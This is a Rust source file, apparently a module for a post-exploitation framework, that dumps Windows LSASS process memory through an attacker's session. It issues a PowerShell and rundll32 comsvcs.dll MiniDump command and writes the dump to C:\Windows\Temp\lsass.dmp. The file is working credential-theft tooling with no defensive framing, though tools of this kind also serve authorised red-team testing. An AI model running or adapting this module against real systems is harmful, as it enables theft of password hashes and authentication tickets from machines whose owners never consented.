use crate::core::modules::Module;
use crate::core::loghandler::LogHandler;
use crate::cli::output::send_command_and_get_output_until;

pub struct LsassDumpWindows;

impl Module for LsassDumpWindows {
    fn name(&self) -> &'static str { "windows/lsass-dump" }
    fn description(&self) -> &'static str { "Dump LSASS memory using comsvcs.dll (SYSTEM required, likely detected)" }
    fn usage(&self) -> &'static str { "Usage: run-module windows/lsass-dump <session_id>" }
    fn platform(&self) -> &'static str { "windows" }
    fn category(&self) -> &'static str { "credentials" }
    fn run(&self, session_id: usize, session_manager: &crate::core::session::SessionManager, _args: Vec<String>) {
        if let Some(session) = session_manager.get(session_id) {
            let marker = "__AEGIS_END__";
            let cmd = format!(
                "$pid = (Get-Process lsass).Id; rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $pid C:\\Windows\\Temp\\lsass.dmp full; echo {}\n",
                marker
            );
            match send_command_and_get_output_until(&session, &cmd, marker) {
                Ok(data) => {
                    if let Some(idx) = data.windows(marker.len()).rposition(|window| window == marker.as_bytes()) {
                        let output = &data[..idx];
                        println!("{}", String::from_utf8_lossy(output));
                        LogHandler::success("LSASS memory dumped to C:\\Windows\\Temp\\lsass.dmp")
                    } else {
                        LogHandler::error("End marker not found in output");
                    }
                }
                Err(e) => LogHandler::error(&format!("Failed to dump LSASS: {}", e)),
            }
        }
    }
}